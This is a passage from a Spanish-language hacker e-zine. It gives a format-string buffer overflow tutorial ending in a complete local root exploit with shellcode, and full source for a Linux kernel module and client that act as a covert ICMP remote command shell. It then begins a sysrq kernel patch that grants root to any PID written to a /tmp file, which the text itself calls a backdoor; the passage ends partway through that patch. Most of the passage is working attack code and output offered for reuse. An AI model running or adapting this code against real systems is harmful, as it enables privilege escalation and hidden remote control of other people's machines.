+string se puede expandir a causa del fomato. Veamoslo con un ejemplo de
+ejecucion:
+
+
+     donasec ~# ./vulnerable hola
+     hola
+     donasec ~# ./vulnerable expandete%x%x%x%x
+     expandete1000bffffbc4400024ba
+     donasec ~#
+
+
+    Podeis obserbar claramente la rareza. Los "%x%x%x%x" ha sido substituidos
+por "1000bffffbc4400024ba", y strlen("%x%x%x%x") es menor que
+strlen("1000bffffbc4400024ba"), por lo que si pones los suficientes %x puedes
+llegar a desbordar el buf2 y sobreescribir el valor de RET.
+
+
+     donasec ~# ./vulnerable expandete%x%x%x%x%xx%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%
+     expandete1000bffffb44400024babffffd70x40002604617078657465646e2578256525782578787825787825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782525000000000000000000000
+     Segmentation fault
+     donasec ~#
+
+
+    Si has sido observador, te habras dado cuenta que no todos los "%x" son
+substituidos por un numero con las mimas cifras, lo que, en principio nos
+priva el control del tamaño del buffer que se va a crear, sinembargo si hacemos
+algo como "%.8x" nos aseguramos que se imprimiran 8 cifras/caracteres.
+
+
+      donasec ~# ./vulnerable %.8x
+      00000100
+      donasec ~#
+		  
+		    
+     Vamos ahora a hacer una pequeña prueba con gdb, para que veais lo facil
+que es explotar este tipo de programas.
+
+
+      donasec ~# gdb vulnerable
+      GNU gdb 5.0.90-cvs (MI_OUT)
+      Copyright 2001 Free Software Foundation, Inc.
+      GDB is free software, covered by the GNU General Public License, and you are
+      welcome to change it and/or distribute copies of it under certain conditions.
+      Type "show copying" to see the conditions.
+      There is absolutely no warranty for GDB.  Type "show warranty" for details.
+      This GDB was configured as "i386-linux"...(no debugging symbols found)...
+      (gdb)  r %.264xAAAA
+      Starting program: /tmp/vulnerable %.264xAAAA
+      000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100AAAA
+								        (no debugging symbols found)...(no debugging symbols found)...
+      Program received signal SIGSEGV, Segmentation fault.
+      0x41414141 in ?? ()
+      (gdb) quit
+      The program is running.  Exit anyway? (y or n) y
+      donasec ~#
+												      
+
+     Con %.264x llenamos ya el buffer (que es de 260 debido a la alineacion que
+se realiza en el stack) y EBP, de manera que las 4 A's (de ahi el 0x41414141)
+siguientes van destinadas a RET. Simple, facil, sencillo... ¿no?
+
+     No creo que sea necesario que meta aqui el exploit, pues si habeis
+entendido el funcionamiento de esta tecnica (y creo que es lo suficientemente
+simple como para que lo hayais hecho) sereis capaces de hacerlo vosotros
+mismos, sinembargo para seguir la tonica y la tradicion de los articulos de
+explotacion aqui os lo dejo.
+
+
+---/ exploit.c /---
+
+#include <stdio.h>
+#include <unistd.h>
+
+#define ENVBUF_SIZE     8192
+#define NOP             0x90
+#define RET_ADDR        0xBFFFFF50  /* Por ahi suele estar environ :) */
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh\0";
+
+int main(int argc, char **argv) {
+  char *exec_argv[3];
+  char *exec_envp[2];
+  char envbuf[ENVBUF_SIZE+1];
+  char evilbuf[]="%.264xAAAA\0";
+  unsigned long *ptr=&evilbuf[6];
+  if (argc<2) {
+    printf("Usage: %s <prog>\n", argv[0]);
+    exit(0);
+  }
+  memset(envbuf, NOP, ENVBUF_SIZE);
+  memcpy(envbuf, "ENV=", 4);
+  memcpy(envbuf+(ENVBUF_SIZE-strlen(shellcode)), shellcode, strlen(shellcode));
+  (*ptr)=RET_ADDR;
+  exec_argv[0]=argv[1];
+  exec_argv[1]=evilbuf;
+  exec_argv[2]=NULL;
+  exec_envp[0]=envbuf;
+  exec_envp[1]=NULL;
+  printf("Exploting...\n");
+  execve(argv[1], exec_argv, exec_envp);
+  printf("Something bad!\n");
+}
+					      
+---/ exploit.c /---
+
+
+    A probar...
+
+
+      donasec ~# ./exploit vulnerable
+      Exploting...
+      000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100Pÿÿ¿
+      sh-2.05a#
+			    
+
+
+4.- Conclusion
+--------------
+
+    Si bien los problemas presentados por bugs de formato (como puede ser el
+encontrado en la version 2.6.0 del wu-ftpd) suelen usar otra tecnica de
+explotacion algo mas compleja, ya que las funciones *printf no escriben en
+un buffer sino en pantalla, un socket o un fichero, queda demostrado que en
+ciertas ocasiones se puede usar esta tecnica de explotacion, que es ademas
+MUY sencilla de realizar.
+
+
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 4 /--/ ICMP-Shell atraves del kernel. /--/ ZiSXko /-----------------------
+-------------------------------------------------------------------------------
+
+
+1.- ICMP-Shell
+--------------
+
+Vamos a explicar en que consiste el siguiente codigo y la utilidad que puede
+tener este para nosotros en futuros proyectos o en lo que nos apetezca hacer
+Se trata de un modulo del Kernel el cual lo podriamos desglosar en las
+siguientes partes:
+
+    * Acceso al Sistema de Ficheros /proc
+
+    * Control y ejecucion de Hilos del Kernel
+    
+    * Acceso a un driver
+    
+Para que entendamos el funcionamiento del codigo vamos a realizar una breve
+descripcion de lo que realiza el modulo.
+
+El modulo se carga y cambia la funcion para enviar paquetes del driver
+(hard_start_xmit) especificado y crea un hilo que comprueba constantemente el
+valor de una variable.
+
+Cuando el cliente envia un paquete ICMP con code=8 y type=0 con unas
+caracteristicas determinadas el Sistema en el que este el modulo cargado lo mas
+normal es que responda a ese paquete con una copia de este pero cambiando
+ciertos parametros, direccion, type, code, etc...
+
+El host responde a ese paquete la ultima funcion que ejecutara de la pila, en
+un linux :), sera hard_start_xmit, la cual nostros tenemos interceptada y
+podremos ver si el paquete viene firmado en este caso con una password que en
+este caso es zIsXkO.
+
+Una vez que el paquete esta autentificado y reconocido por nuestra funcion se
+indica al hilo principal que se prepare para la ejecucion de la instruccion que
+viene en el paquete y la ejecutara.
+
+Como al hilo no le habra dado tiempo a ejecutar el comando recivido al cliente
+le mandaremos una notificacion de espera y el cliente nos respondera con una
+notificacion de que esta esperando.
+
+El hilo se prepara a ejecutar y lanza un hilo hijo que redireccionara su salida
+al fichero que tenemos en /proc, y nuestro buffer para enviar los datos se
+rellenara, y cuando recivamos un paquete autentificado del cliente le
+encapsularemos los datos de vuelta.
+
+Bueno el resto del codigo esta comentado y espero que os sea de utilidad para
+vuestros modulitos y demas codigos que realiceis
+
+
+2.- El codigo
+-------------
+
+---/ icmp.c /---
+
+/* icmp.c
+ * Zisxko Chistems Presents
+ * Compilar con
+ * gcc icmp.c -c -fomit-frame-pointer -O2
+ * Este codigo fuente ha sido desarrolado bajo un kernel 2.4.12
+ */
+#define MODULE
+#define __KERNEL__
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/pkt_sched.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h> /* para el espacio de direcciones */
+#include <linux/unistd.h>
+#include <linux/sched.h>
+
+#include <linux/tqueue.h>
+#include <linux/wait.h>
+#include <asm/unistd.h>
+#include <asm/semaphore.h>
+#include <asm/smplock.h>/* para las fuciones lock_kernel y unlock_kernel*/
+#include <linux/brlock.h>
+
+#include <linux/signal.h>
+#include <linux/proc_fs.h>
+#include "icmp.h"
+
+#define TEMP_FICHERO "/proc/tmpicmp" /*fichero donde redireccionamos la salida
+del comando
+							a ejecutar */
+#define FICHERO_PROC_USER_KERNEL "tmpicmp"
+
+static char *envp[] = { "HOME=/", "TERM=tty1", "PATH=/sbin:/bin", NULL };
+int errno=0;
+
+struct net_device *net_dispo;
+int (*original_hard_start_xmit)(struct sk_buff *skb, struct net_device *dev);
+
+atomic_t hay_instruccion;/* variable que utilizamos como un semaforo ,
+				para indicar al hilo que hay una instruccion para ejecutar*/
+atomic_t instruccion_ejecutada; /* indicamos que el hilo ejecuto la instruccion
+y el
+						buffer con la info esta disponible */
+char buffer[MAX_BUFFER];/*buffer con los datos de salida */
+char comando[MAX_BUFFER];
+char *instruccion[9];
+char comando_path[MAX_BUFFER];
+
+char *dispositivo="eth0";
+
+typedef struct kthread_struct
+{
+        /* estructura de la tarea donde va ha estar el hilo asociado */
+        struct task_struct *thread;
+        /* Cola de tareas que necesitamos para lanzar el hilo */
+        struct tq_struct tq;
+        /* funcion para iniciar el hilo */
+        void (*function) (struct kthread_struct *kthread);
+        /* cola de hilos */
+        wait_queue_head_t queue;
+
+        int kill_flag;
+
+} kthread_t;
+
+kthread_t hilo_comando;
+
+/* Funciones para el user-space */
+static inline _syscall2 (int, open, char *, name, int, mode);
+static inline _syscall1 (int, close, int, fd);
+static inline _syscall1 (int, waitpid, int, pid);
+static inline _syscall2 (int, dup2, int, fd, int, disp);
+static inline _syscall3 (int, execve, char *, file, char **, argv, char **,
+env);
+
+/* Declaracion global de struct packet_type */
+struct packet_type paquete;
+struct proc_dir_entry *ent;
+
+/******************************************************************/
+/*								  */
+/*	Funciones para el Acceso al /proc			  */
+/*								  */
+/******************************************************************/
+
+static ssize_t salida_fichero_swap(struct file *file,char *buf,size_t
+len,loff_t *offset)
+{
+	/* Este codigo se puede comentar pero suele ser muy util ver lo que
+	la otra persona esta realizando y con un simple more /proc/tmpicmp lo vemos :
+)*/
+	static int finished=0;
+	int i;
+
+	if(finished)
+	{
+		finished=0;
+		return 0;
+	}
+
+	for(i=0;i<len && buffer[i];i++)
+		put_user(buffer[i],buf+i);
+
+	finished=1;
+	return i;
+}
+
+static ssize_t entrada_fichero_swap(struct file *file,const char *buf,size_t
+lenght,loff_t *offset)
+{
+	/*El proceso esta escribiendo la salida de su ejecucion en nosotros */
+	int aux,i;
+
+        for(i=0;i<MAX_BUFFER-1 && i<lenght;i++)
+                get_user(buffer[i],buf+i);
+
+        buffer[i]= '\0';
+
+	return i;
+}
+
+static int fichero_swap_permisos(struct inode *inode,int op)
+{
+	/* op==4 es lectura , op==2 es escritura y solo puede hacerlo el root */
+	if(op==4||(op==2 && current->euid==0))
+		return 0;
+	return -EACCES;
+}
+
+int abrir_fichero_swap(struct inode *inode,struct file *file)
+{
+	MOD_INC_USE_COUNT;
+	return 0;
+}
+
+int cierra_fichero_swap(struct inode *inode,struct file *file)
+{
+	MOD_DEC_USE_COUNT;
+	return 0;
+}
+
+static struct file_operations Operaciones_fichero_swap = {
+	read:salida_fichero_swap,
+      	write:entrada_fichero_swap,
+      	open:abrir_fichero_swap,
+      	release:cierra_fichero_swap
+};
+
+static struct inode_operations Operaciones_sobre_Inodo_swap = {
+	create:&Operaciones_fichero_swap,
+	permission:fichero_swap_permisos
+};
+
+static struct proc_dir_entry Entrada_fichero_Proc_swap = {
+	0,
+      	7,
+      	FICHERO_PROC_USER_KERNEL,
+      	S_IFREG|S_IRUGO|S_IWUSR,
+      	1,
+      	0,
+      	0,
+	MAX_BUFFER,
+      	&Operaciones_sobre_Inodo_swap,
+      	&Operaciones_fichero_swap,
+      	NULL
+};
+
+
+/****************************************************************/
+/*                                                              */
+/*      Funciones Auxiliares                                    */
+/*                                                              */
+/****************************************************************/
+
+void copia_buffer_desde(char *cad1,const char *cad2,int pos){
+        int k;
+        char *i,*j;
+
+        i=cad1;
+        j=cad2;
+
+        for(k=0;k<pos;k++)j++;
+
+        while(*j)
+        {
+                *i=*j;
+                i++;
+                j++;
+        }
+}
+
+/****************************************************************/
+/*                                                              */
+/*      Funciones para el tratamiento ICMP                      */
+/*                                                              */
+/****************************************************************/
+
+
+u_short in_chksum(u_short *ptr, int nbytes)
+{
+  	register long           sum;            /* assumes long == 32 bits */
+  	u_short                 oddbyte;
+  	register u_short        answer;         /* assumes u_short == 16 bits */
+  	sum = 0;
+
+	while (nbytes > 1)
+  	{
+    		sum += *ptr++;
+    		nbytes -= 2;
+  	}
+  	if (nbytes == 1)
+  	{
+     		oddbyte = 0;            /* make sure top half is zero */
+     		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+     		sum += oddbyte;
+  	}
+  	sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
+  	sum += (sum >> 16);                     /* add carry */
+  	answer = ~sum;          /* ones-complement, then truncate to 16 bits */
+  	return((u_short) answer);
+}
+
+
+int filtro_icmp(struct sk_buff *skb, struct net_device *dev)
+{
+      	unsigned long flags;
+      	char *data;
+      	int datalen;
+      	char buffer_aux[MAX_BUFFER];
+
+      	if(skb->protocol==__constant_htons(ETH_P_IP))
+      		if(skb->nh.iph->version==4)
+            	{			
+      			skb->h.raw=skb->nh.raw + skb->nh.iph->ihl *4;/* Ajustamos el paquete
+*/
+                  	if(skb->nh.iph->protocol==IPPROTO_ICMP)
+                  	{
+                  		if((skb->h.icmph->type==0)&&(skb->h.icmph->type==0))
+                        	{
+                        		data=(skb->h.raw)+sizeof(struct icmphdr);
+                              		datalen=skb->len;
+                              		if(datalen>=strlen(PASS))
+                              		{
+                              			memset(buffer_aux,0,MAX_BUFFER);
+						sprintf(buffer_aux,"%s",data); 	
+                                    		if(strncmp(buffer_aux,PASS,strlen
+(PASS))==0)
+                                    		{
+                                    			if(strncmp(&buffer_aux[strlen
+(PASS)],CLIENTE_INSTRUCCION,1)==0)
+                                          		{
+								/* a llegado una peticion de ejecucion por parte del cliente */	
+                                                		memset
+(comando_path,0,MAX_BUFFER);
+                                                		copia_buffer_desde
+(comando_path,buffer_aux,strlen(PASS)+1);
+											
+								/* Bloqueamos el driver y guardamos el estado de los flags */
+                                                		spin_lock_irqsave(&dev-
+>queue_lock,flags);
+
+                                                		atomic_set
+(&hay_instruccion,1);
+								/* Desbloqueamos el driver y restauramos el estado de los flags */	
+                                                		spin_unlock_irqrestore(&dev-
+>queue_lock,flags);
+                                         		}
+									
+							memset(buffer_aux,0,MAX_BUFFER);
+
+                                        		if(atomic_read
+(&instruccion_ejecutada)==1)
+                                        		{
+								/*La instruccion se ejecuto y la encapsulamos los resultados*/	
+                                                		strcat
+(buffer_aux,HOST_DATOS);
+                                                		strncat
+(buffer_aux,buffer,MAX_BUFFER-1);
+								atomic_dec(&instruccion_ejecutada);
+                                        		}
+                                        		else
+                                        		{
+                                           			/*No dio tiempo al hilo a
+ejecutar la instruccion*/
+                                                		strcat
+(buffer_aux,HOST_PROCESANDO_INSTRUCCION);
+                                        		}
+
+                                          		memcpy(data,buffer_aux,datalen);
+							
+							/*Recalculamos el paquete*/
+                                        		memset(&skb->nh.iph->check,0,2);
+                                        		skb->nh.iph->check=in_chksum((u_short
+*)skb->nh.iph,skb->nh.iph->ihl*4);
+                                        		memset(&skb->h.icmph->checksum,0,2);
+                                        		skb->h.icmph->checksum=in_chksum(
+(u_short *)skb->h.icmph,sizeof(struct icmphdr));
+						}
+					}
+				}
+			}
+		}
+	return(original_hard_start_xmit(skb,dev));
+}
+
+/****************************************************************/
+/*                                                              */
+/*      Funciones para el tratamiento de los hilos              */
+/*                                                              */
+/****************************************************************/
+
+void mata_hilo_kernel(kthread_t *khilo)
+{
+	lock_kernel();
+
+      	mb();
+
+      	khilo->kill_flag=1;
+
+      	mb();
+
+      	kill_proc(khilo->thread->pid, SIGKILL, 1);/*enviamos la señal de muerte
+al hilo*/
+
+      	unlock_kernel();/* desbloqueamos el kernel */
+
+      	/* ahora sabemos que el hilo esta en estado zombie, y llamamos
+      	al hilo keventd para que lo elimine totalmente */
+      	kill_proc(2, SIGCHLD, 1);
+}
+
+static void kthread_launcher(void *data)
+{
+      	kthread_t *kthread = data;
+      	kernel_thread((int (*)(void *))kthread->function, (void *)kthread, 0);
+
+}
+
+
+void inicia_hilo_kernel(void (*func)(kthread_t *), kthread_t *khilo)
+{
+
+      	khilo->function=func;/*guardamos la funcion a Ejecutar */
+
+      	/* inicializamos la estruccutrua en la cola de tareas */
+      	khilo->tq.sync = 0;
+      	INIT_LIST_HEAD(&khilo->tq.list);
+      	khilo->tq.routine =  kthread_launcher;
+      	khilo->tq.data = khilo;
+
+      	/* y la ponemos lista para ejecucion en el planificador */
+      	schedule_task(&khilo->tq);
+}
+
+
+void init_hilo_kernel(kthread_t *khilo, char *name)
+{
+      	lock_kernel();/* bloqueamos el kernel */
+
+      	khilo->thread = current;/* asignamos a nuestra estruccura el propio
+proceso */
+
+      	/* establecemos las señales que queremos responder con el hilo */
+      	siginitsetinv(&current->blocked, sigmask(SIGKILL)|sigmask
+(SIGINT)|sigmask(SIGTERM));
+
+      	/* inicializamos al cola de espera */
+      	init_waitqueue_head(&khilo->queue);
+
+      	khilo->kill_flag=0;/* inicializamos el flag a 0, osea para que no
+muera*/
+
+      	/* establecemos el nombre del hilo, que es el que aparecerna en un ps ,
+maximo 15 caracteres + 0 */
+      	sprintf(current->comm, name);
+
+      	unlock_kernel();/*desbloqueamos el kernel para que el resto pueda currar
+un poquito, pero poco */
+
+}
+
+int hilo_ejecutor(void *args)
+{
+      	mm_segment_t old_fs;
+      	int fd;
+
+      	old_fs=current->addr_limit;
+      	current->addr_limit=(KERNEL_DS);
+
+      	fd=open(TEMP_FICHERO,O_WRONLY);
+      	if(fd!=-1)
+      	{
+      		dup2(fd,1);
+            	close(fd);
+            	execve(comando_path,instruccion ,envp);
+      	}
+      	current->addr_limit=old_fs;
+}
+
+static void hilo_de_ejecucion(kthread_t *khilo)
+{
+	char aux[MAX_BUFFER];
+      	int i,val;
+      	/* inicializamos el hilo, esto seria el constructor */
+      	init_hilo_kernel(khilo, "hilo ziSXko");
+
+      	while(1)
+      	{
+      		interruptible_sleep_on_timeout(&khilo->queue, HZ);
+
+            	mb();/*barrido de memoria, recomendado sobre todo en alpha :)*/
+
+            	if(atomic_read(&hay_instruccion)==1)
+            	{
+            		memset(aux,0,MAX_BUFFER);
+                  	memset(comando,0,MAX_BUFFER);
+
+                  	for(i=0;i<strlen(comando_path);i++)
+                  		if(strncmp(&comando_path[i],"/",1)==0)
+                        		val=i;
+
+                  	copia_buffer_desde(comando,comando_path,val+1);
+
+                  	for(i=0;i<9;i++)instruccion[i]=NULL;
+
+                  	instruccion[0]=comando;
+
+                  	kernel_thread(hilo_ejecutor,NULL,0);
+
+                  	interruptible_sleep_on_timeout(&khilo->queue, HZ);
+
+                  	atomic_dec(&hay_instruccion);/* lo pone a cero */
+                  	atomic_inc(&instruccion_ejecutada);/* la pone a uno */
+		}
+
+            	if(khilo->kill_flag)
+            	{
+			lock_kernel();/*bloqueamos, cuando el hilo salga se ejecuta implicitamente
+unlock_kernel*/
+                  	khilo->thread=NULL;
+                  	mb();
+                  	break;
+		}
+	}
+}
+
+int init_module(void)
+{
+	atomic_set(&instruccion_ejecutada,0);
+      	atomic_set(&hay_instruccion,0);
+
+      	net_dispo=dev_get_by_name(dispositivo);
+      	if(!net_dispo)
+      	{
+		printk("Imposible encontrar Dispositivo, descarte el modulo\n");
+            	return 0;
+	}
+
+      	original_hard_start_xmit = net_dispo->hard_start_xmit;
+
+      	net_dispo->hard_start_xmit=&filtro_icmp;
+
+      	inicia_hilo_kernel(hilo_de_ejecucion,&hilo_comando);
+
+      	memset(buffer,0,MAX_BUFFER);
+
+      	if((ent=create_proc_entry(FICHERO_PROC_USER_KERNEL, S_IRUGO | S_IWUSR,
+NULL))!=NULL)
+      	{
+		ent->proc_iops=&Operaciones_sobre_Inodo_swap;
+            	ent->proc_fops=&Operaciones_fichero_swap;
+	}
+	else
+      	{
+		printk(KERN_WARNING"No se puede Crear el Fichero en /proc\n");
+            	printk(KERN_WARNING"La Shell no Funcionara Correctamente\n");
+	}
+
+      	printk("ICMP-Shell Instalada\n");
+      	printk("Poguered by ziSXko Chistems 2001\n");
+      	return 0;
+}
+
+void cleanup_module(void)
+{
+	net_dispo->hard_start_xmit=original_hard_start_xmit;
+      	mata_hilo_kernel(&hilo_comando);
+      	printk("ICMP-Shell Descargada\n");
+      	printk("Poguered by ziSXko Chistems 2001\n");
+      	remove_proc_entry(FICHERO_PROC_USER_KERNEL,NULL);
+}
+
+---/ icmp.c /---
+
+
+---/ icmp.h /---
+
+/*
+ * icmp.h
+ */
+/* definicion de protocolo que vamos a usar sobre icmp */
+#define CLIENTE_ESPERANDO_DATOS "0"
+#define HOST_PROCESANDO_INSTRUCCION "1"
+#define CLIENTE_INSTRUCCION "2"
+#define HOST_DATOS "3"
+
+
+#define MAX_BUFFER 1000
+#define PASS "zIsXkO" /*la password que tiene que ir con la cadena que
+recivimos*/
+#define MAX_PASSWORD 6/*Longitud de la password*/
+
+---/ icmp.h /---
+
+
+---/ shellicmp.c /---
+
+/*
+ * shellicmp.c
+ * Cliente Basico para el modulo en user-space :)
+ */
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/ip_icmp.h>
+#include "icmp.h"
+#include <signal.h>
+#define CERRAR_SESION "bye"
+
+#define ERROR -1
+
+int pid=-1;
+struct protoent *proto=NULL;
+struct sockaddr_in addr;
+
+struct paquete
+{
+        struct icmphdr icmp;
+        char datos[MAX_BUFFER];
+};
+
+unsigned short checksum(void *b, int len)
+{	unsigned short *buf = b;
+	unsigned int sum=0;
+	unsigned short result;
+
+	for ( sum = 0; len > 1; len -= 2 )
+		sum += *buf++;
+	if ( len == 1 )
+		sum += *(unsigned char*)buf;
+	sum = (sum >> 16) + (sum & 0xFFFF);
+	sum += (sum >> 16);
+	result = ~sum;
+	return result;
+}
+
+
+void envia_paquete_icmp(char *datos)
+{
+        struct paquete pkt;
+        int fd;
+
+        fd=socket(PF_INET,SOCK_RAW,IPPROTO_ICMP);
+        if(fd==ERROR)
+        {
+                perror("socket");
+                exit(-1);
+        }
+
+        bzero(&pkt,sizeof(pkt));
+        pkt.icmp.type=ICMP_ECHO;
+        pkt.icmp.un.echo.id=pid;
+        strncpy(pkt.datos,datos,strlen(datos));
+        pkt.icmp.un.echo.sequence=1;
+        pkt.icmp.checksum=checksum(&pkt,sizeof(pkt));
+
+        if(sendto(fd,&pkt,sizeof(pkt),0,&addr,sizeof(struct
+sockaddr_in))==ERROR)
+        {
+                perror("send");
+                exit(-1);
+        }
+}
+
+
+void muestra_datos(void *buf, int bytes)
+{
+	
+	struct iphdr *ip = buf;
+	struct icmphdr *icmp = buf+ip->ihl*4;
+        char *datos= buf+ip->ihl*4+sizeof(struct icmphdr);
+        char buffer[MAX_BUFFER],aux[MAX_BUFFER];
+        int comando;
+		
+	if((icmp->un.echo.id==pid)&&(icmp->type==0))
+        {
+                memset(buffer,0,MAX_BUFFER);
+                strncpy(buffer,datos,MAX_BUFFER);
+                strncpy(buffer,datos,1);
+                comando=atoi(buffer);
+                switch(comando)
+                {
+                        case 1:
+                 		bzero(aux,MAX_BUFFER);
+                                strcat(aux,PASS);
+                                strcat(aux,CLIENTE_ESPERANDO_DATOS);
+				printf(".");
+				fflush(stdout);
+                                sleep(1);
+                                envia_paquete_icmp(aux);
+                                break;
+                        case 3:
+                                memset(aux,0,MAX_BUFFER);
+                                strncpy(aux,datos,MAX_BUFFER);
+                                aux[0]='-';
+				printf("\n");
+                                printf("Datos del Host\n");
+				printf("%s",aux);
+                                break;
+                        default :
+                                printf("Respuesta Desconocida\n");
+                                break;
+                }
+        }
+}
+
+void espera_datos(void)
+{	
+	int fd;
+	struct sockaddr_in addr;
+	unsigned char buf[1024];
+
+	fd=socket(AF_INET, SOCK_RAW, proto->p_proto);
+	if(fd==ERROR)
+	{
+		perror("socket");
+		exit(-1);
+	}
+	for (;;)
+	{	
+		int bytes, len=sizeof(addr);
+
+		bzero(buf, sizeof(buf));
+		bytes = recvfrom(fd, buf, sizeof(buf), 0, &addr, &len);
+		if ( bytes > 0 )
+			muestra_datos(buf, bytes);
+		else
+			perror("recvfrom");
+	}
+	exit(0);
+}
+
+void ping_y_pong()
+{
+        char buffer[MAX_BUFFER],aux[MAX_BUFFER],aux1[MAX_BUFFER];
+
+        printf("Cliente ICMP-Telnet powered by ziSXko Chistems\n");
+
+	for (;;)
+	{
+                bzero(buffer,MAX_BUFFER);
+                bzero(aux,MAX_BUFFER);
+                bzero(aux1,MAX_BUFFER);
+                printf("Introduce comando:\n");
+                fgets(buffer,MAX_BUFFER-1,stdin);
+			
+                if(strncmp(buffer,CERRAR_SESION,strlen(CERRAR_SESION))==0)
+                        break;
+
+                strncpy(aux1,buffer,strlen(buffer)-1);
+
+                strcat(aux,PASS);
+                strcat(aux,CLIENTE_INSTRUCCION);
+                strcat(aux,aux1);
+
+                printf("Esperando Respuesta\n");
+                sleep(2);
+                envia_paquete_icmp(aux);
+		sleep(1);
+	}
+        printf("Cerrando Sesion\n");
+}
+
+
+int main(int argc, char *argv[])
+{
+        struct hostent *hname;
+        int pidhijo;
+
+
+	if ( argc != 2 )
+	{
+		printf("Usa: %s <addr>\n", argv[0]);
+		exit(0);
+	}
+
+	pid = getpid();
+	proto = getprotobyname("ICMP");
+	hname = gethostbyname(argv[1]);
+	bzero(&addr, sizeof(addr));
+	addr.sin_family = hname->h_addrtype;
+	addr.sin_port = 0;
+	addr.sin_addr.s_addr = *(long*)hname->h_addr;
+	if ((pidhijo=fork())==0)
+		espera_datos();
+	else
+		ping_y_pong();
+
+        kill(pidhijo,SIGKILL);
+        exit(0);
+  }
+
+---/ shellicmp.c /---
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 5 /--/ Pachanga sysrq patch. /--/ Trycky /--------------------------------
+-------------------------------------------------------------------------------
+
+Este deberia de ser el 2 articulo de los docs que publique en numeros
+anteriores sobre el sysrq . Este parche para kernel 2.4.x consiste en que la
+unica forma de ser root en la maquina es localmente , para personas paranoicas
+es un buen parche . El parche simplemente añade una nueva entrada a
+sysrq_key_table[] , esta entrada que la llamaremos sysrq_psys estara asociada
+a la letra 'd' , aunque esto ya es como uno quiera para algo teneis el source
+la implementacion que usado es leer de un fichero donde tu pondras la pid que
+quieras que sea root y listo , con esto taremos seguros que solo se podran
+auntentificar como root localmente y a si podremos configurar nuestra maquina
+para no aceptar de ninguna forma que el root pueda identificarse . Aun a si
+el parche tiene algunas cosas no del todo seguras ya que cualquier usuario
+puede usar esta implementacion una solucion seria definir el MAGIC_PID en un
+directorio donde solo el user en cuestion tuviera permisos para crear el
+fichero :
+
+-#define MAGIC_PID "/tmp/7a69rl0z"
++#define MAGIC_PID "/home/guaysinu/OAA"
+
+A partir de ahora si se tienen los permisos apropiados solo el user guaysinu
+podria grabar la pid para que el sysrq_psys la leyera, aunque de todas formas
+cualquier otro user podria ir sacando informacion donde sobre se podria
+encontrar el fichero con ayuda de : lsof , etc . Otra cosa seria hacer un
+intercambio de claves el psys generaria una palabra al azar y esta la
+encriptariamos con la clave definida por ejemp '#define MAGIC_PASS "OAA"'.
+La cual nos daria una frase encriptada que nosotros ya desencriptariamos y lo
+pasariamos como a argumento al pid en el fichero de MAGIC_PID . Se podria usar
+3DES , MD5 , Blowfish , etc .
+Tambien se podria hacer esto en forma de modulo dado que la serie del Kernel
+2.4.x trae una implementacion nueva del sysrq que treae como novedades por
+ejemplo el poder agregar nuevas acciones al sysrq mediante modulos , mas
+informacion detallada en el propio src del kernel como no y en
+$linux/Documentation/sysrq.txt .
+
+Tal vez este documento sea breve , absurdo e inutil . Nadie lo dudo , pero una
+vez que esta la idea cualquier persona se puede implementar lo que mas le guste
+lanzar un plan de emergencias anti hackeo (aunque el propio sysrq ya lo trae de
+por si matando a todos los procesos ) , o poder desconectar la maquina de la
+red y en ese momento invocar al tripware o cual programa te guste mas para
+comprobar tus permisos y ver si alguien a retocado algun binario , etc .
+
+E incluido un script to cutre para los que les de vageza guardar el pid en el
+file directamente .
+
+Ejemplo :
+
+real@lepton:~ > uname -r ;id
+2.4.18pre2
+uid=1000(real) gid=1000(real) groups=1000(real)
+real@lepton:~ > ps|grep bash  |awk '{print $1}'
+983
+real@lepton:~ > cat > /tmp/7a69rl0z
+983
+
+real@lepton:~ > SysRq : hax0ring
+psys : Marcandose un detallito con la pid => [983]
+
+real@lepton:~ > id
+uid=0(root) gid=0(root) groups=1000(real)
+real@lepton:~ > cat << _EOF_
+> Y colorin colorado esta backdoor a molado
+> _EOF_
+Y colorin colorado esta backdoor a molado
+real@lepton:~ > exit
+
+<++> 7a69Soft/patch_psys01-K24.diff
+14a15,16
+> /* (c) OAA psys : trycky@7a69ezine.org */
+>
+34a37,41
+> #include <linux/compatmac.h>
+> #include <linux/file.h>
+>
+> #define MAGIC_PID "/tmp/7a69rl0z"
+>
+99a107
+> /* psys sysrq handler , Algunas cosas ripeadas del lids  */
+100a109,195
+> int myatoi(char *str)
+> {
+>   int res = 0;
+>   int mul = 1;
+>   char *ptr;
+>   for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
+>     if (*ptr < '0' || *ptr > '9')
+>       return (-1);
+>     res += (*ptr - '0') * mul;
+>     mul *= 10;
+>   }
+>   return (res);
+> }
+>
+> struct task_struct *find_task_struct_by_pid(int pid) {
+>   struct task_struct *p, **htable = &pidhash[pid_hashfn(pid)];
+>   for(p = *htable; p && p->pid != pid; p = p->pidhash_next);
+>   return(p);
+> }
+>
+> static void sysrq_handle_psys(int key, struct pt_regs *pt_regs,
+>             struct kbd_struct *kbd, struct tty_struct *tty) {
+>
+>   pid_t pid;
